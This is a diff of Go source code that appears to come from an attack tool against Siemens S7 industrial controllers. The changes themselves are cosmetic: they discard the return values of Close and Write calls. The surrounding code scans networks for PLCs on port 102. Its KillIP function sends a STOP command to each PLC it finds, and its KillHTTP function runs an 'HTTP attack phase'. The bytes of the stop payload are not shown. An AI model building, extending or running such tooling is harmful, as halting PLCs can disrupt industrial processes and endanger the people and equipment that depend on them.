@@ -58,7 +58,7 @@ func ScanIP(ipList []string) []string {
 		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
 			fmt.Printf("[+] Found S7 PLC at: %s\n", ip)
 			scannedIPs = append(scannedIPs, ip)
-			conn.Close()
+			_ = conn.Close()
 		}
 	}
 	fmt.Printf("[+] Scan complete. Found %d S7 PLCs\n", len(scannedIPs))
@@ -74,7 +74,7 @@ func VerifyTargets(targets []string) []string {
 		if conn, err := net.DialTimeout("tcp", target, 1*time.Second); err == nil {
 			fmt.Printf("[+] Confirmed S7 PLC at: %s\n", ip)
 			validTargets = append(validTargets, ip)
-			conn.Close()
+			_ = conn.Close()
 		} else {
 			fmt.Printf("[-] Target %s is not reachable on port 102\n", ip)
 		}
@@ -89,8 +89,8 @@ func KillIP(scannedIPs []string) {
 	for _, ip := range scannedIPs {
 		if conn, err := net.Dial("tcp", ip+":102"); err == nil {
 			fmt.Printf("[!] Sending STOP command to PLC at %s via S7 protocol\n", ip)
-			conn.Write([]byte(stop))
-			conn.Close()
+			_, _ = conn.Write([]byte(stop))
+			_ = conn.Close()
 		} else {
 			fmt.Printf("[-] Failed to connect to %s: %v\n", ip, err)
 		}
@@ -115,7 +115,7 @@ func KillHTTP(scannedIPs []string) {
 			fmt.Printf("[-] HTTP request failed for %s: %v\n", ip, err)
 		} else {
 			fmt.Printf("[+] HTTP request sent successfully to %s (Status: %s)\n", ip, resp.Status)
-			resp.Body.Close()
+			_ = resp.Body.Close()
 		}
 	}
 	fmt.Printf("[*] HTTP attack phase complete\n")
